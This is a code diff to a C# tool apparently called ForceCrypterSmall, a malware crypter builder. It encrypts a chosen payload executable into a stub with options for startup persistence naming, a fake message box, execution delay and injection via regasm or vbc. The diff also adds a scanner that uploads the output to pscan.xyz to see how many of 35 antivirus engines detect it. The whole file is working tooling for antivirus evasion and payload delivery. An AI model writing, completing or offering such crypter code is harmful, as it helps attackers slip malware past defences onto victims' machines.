@@ -101,13 +101,10 @@ namespace ForceCrypterSmall
                 }
             }
         }
-
-
-        private void nsRandomPool1_ValueChanged(object sender)
-        {
-            //Making a random key
-            txtEncryptionKey.Text = nsRandomPool1.Value + RandomString(300);
-        }
+        
+        
+       
+        
 
         private void btnRandomize_Click_1(object sender, EventArgs e)
         {
@@ -132,7 +129,7 @@ namespace ForceCrypterSmall
                 if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                 {
                     //File version info is all the assembly information about the file we picked with the open file dialog
-
+                    
                     FileVersionInfo myFileVersionInfo =
                     FileVersionInfo.GetVersionInfo(ofd.FileName);
                     //Changing the text boxes test to be the assembly information of the file we selected
@@ -158,9 +155,12 @@ namespace ForceCrypterSmall
                 Filter = "Executable Files|*.exe",
                 InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             };
+            
+            
             //If he choose and everything is good
             if (FSave.ShowDialog() == DialogResult.OK)
             {
+                
                 //Refrencing our stub
                 string boop = Properties.Resources.boop;
                 //Assembly information
@@ -186,6 +186,8 @@ namespace ForceCrypterSmall
                     //FileName
                     boop = boop.Replace("[finame-replace]", txtStartup.Text);
                 }
+              
+               
                 if (cbMsgBox.Checked)
                 {
                     boop = boop.Replace("[fakemessage-replace]", "true");
@@ -196,8 +198,9 @@ namespace ForceCrypterSmall
                 {
                     boop = boop.Replace("[fakemessage-replace]", "false");
                 }
+                string encryptionkey = RandomString(300);
                 //Replacing the key in the stub with our encryption key
-                boop = boop.Replace("[key-replace]", txtEncryptionKey.Text);
+                boop = boop.Replace("[key-replace]", encryptionkey);
                 //Reading the bytes from our payload
                 byte[] fBytes = File.ReadAllBytes(txtPayload.Text);
                 //Crypting process
@@ -205,7 +208,7 @@ namespace ForceCrypterSmall
                 //Crypting process
                 byte[] first = Encoding.UTF8.GetBytes(fCrypted);
                 //Getting the bytes from the encryption key
-                byte[] enckey = Encoding.UTF8.GetBytes(txtEncryptionKey.Text);
+                byte[] enckey = Encoding.UTF8.GetBytes(encryptionkey);
                 //Making a hash for the key
                 enckey = SHA256.Create().ComputeHash(enckey);
                 //Encrypting the bytes of the payload
@@ -218,16 +221,13 @@ namespace ForceCrypterSmall
                     boop = boop.Replace("[inject-replace]", "[regasm]");
                 if(rbVbc.Checked)
                     boop = boop.Replace("[inject-replace]", "[vbc]");
-                //Checking if user checked delay
-                if (cbDelay.Checked)
-                {
-                    
+                    //Checking if user wanted delay
+                    if(txtDelay.Text!=null)
                     boop = boop.Replace("[delay-replace]", txtDelay.Text);
-                }
-                else
-                {
+                    if(txtDelay.Text == ""| txtDelay.Text == null)
                     boop = boop.Replace("[delay-replace]", "0");
-                }
+
+                
 
                    
                     bool worked;
@@ -238,6 +238,7 @@ namespace ForceCrypterSmall
                     {
                         //Adding the encrypted bytes to the resource file
                         Writer.AddResource("encfile", encBytes);
+                       
                         //Generating             
                         Writer.Generate();
                     }
@@ -266,27 +267,83 @@ namespace ForceCrypterSmall
                     }
                 }
             }
-
-        private void nsButton1_Click(object sender, EventArgs e)
+        public void Scan(string Filename) //File Scan
         {
-
-            //Open file dialog to let the user select a file to scan
-            using (OpenFileDialog ofd = new OpenFileDialog())
+            try
             {
-                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
-                {
-                    ofd.Filter = "Payload|*.exe";
-                    txtScanFile.Text = ofd.FileName;
-                }
-
+                WebClient WBC = new WebClient(); //New WebClient
+                WBC.UploadFileCompleted += new UploadFileCompletedEventHandler(GetResults); //Adding Handler For Completion of  WebClient Upload
+                WBC.UploadFileAsync(new Uri("https://www.pscan.xyz/api.php"), "POST", Filename); //Upload File for scan
+                while (WBC.IsBusy) { Application.DoEvents(); } // While Webclient is busy Do other Events
             }
+            catch (Exception ex)
 
+            {
+                this.btnScan.Enabled = true;
+                MessageBox.Show(ex.Message); //Show Messagebox On Error
+            }
+        }
+        private void GetResults(object sender, System.Net.UploadFileCompletedEventArgs e) //Get  Response from Server
+        {
+            try
+            {
+                string Results = System.Text.Encoding.UTF8.GetString(e.Result); //Get Response
+                AddtoLV(Results); //Add Response to Listivew
+                this.btnScan.Enabled = true;
+            }
+            catch (Exception ex)
+            {
+                this.btnScan.Enabled = true;
+                MessageBox.Show(ex.Message); //Show Messagebox On Error
+            }
+        }
+        private void AddtoLV(string response) //Add Response to Listview
+        {
+            listView1.Items.Clear(); //Remove scanned file trace
+            try
+            {
+                string[] AVDelimiter = new string[] { "[NextAV]" }; //AVs Delimiter
+                string[] AV = response.Split(AVDelimiter, StringSplitOptions.RemoveEmptyEntries); // AVs Splitter
+                string[] Delimiter1 = new string[] { "[ResultDetails]" }; //Result Details Delimiter
+                string[] ScanDetails = response.Split(Delimiter1, StringSplitOptions.RemoveEmptyEntries); //Split Results from Details
+                string[] Links = new string[] { "[Details]" }; //Details Delimiter
+                string[] ii = ScanDetails[1].Split(Links, StringSplitOptions.RemoveEmptyEntries); //Split Scan Details
+                txtScanRate.Text = ii[4]; //Detection Rate
+                txtScanLink.Text = ii[5]; //Scan Results Link
+                int processed = 0; //AV Counter
+                foreach (var i in AV) //Split Each AV
+                {
+                    if (++processed == 36) break; //Stop Adding when Added all 35 AVs
+                    string[] fa = new string[] { "[]Result[]" }; //Delimiter 
+                    string[] fr = i.Split(fa, StringSplitOptions.RemoveEmptyEntries); //Split AV From Result
+                    ListViewItem x = new ListViewItem(fr[0]); //Add item AV
+                    x.SubItems.Add(fr[1]); //Add AV result to Item
+                    if (fr[1] == "OK")
+                    {
+                        x.ForeColor = Color.ForestGreen; //Lime Color For Clean Result
+                    }
+                    else
+                    {
+                        x.ForeColor = Color.Red; //Red Color for Infected Result
+                    }
+                    listView1.Items.Add(x); //Add AV and its Result to Listivew
+                }
+            }
+            catch (Exception ex) { MessageBox.Show(ex.Message); } //Message Anny error Occured
         }
 
-        private void nsButton2_Click(object sender, EventArgs e)
+        private void btnScanFile_Click(object sender, EventArgs e)
         {
-            
+            OpenFileDialog OFD = new OpenFileDialog(); //New OpenFileDialog
+            DialogResult result = OFD.ShowDialog(); // Show OpenFileDialog
+            if (result == DialogResult.OK) // Test result.               
+            { txtScanFile.Text = OFD.FileName; }
+        }
 
+        private void btnScan_Click(object sender, EventArgs e)
+        {
+            this.btnScan.Enabled = false;
+            Scan(txtScanFile.Text);
         }
     }
 }
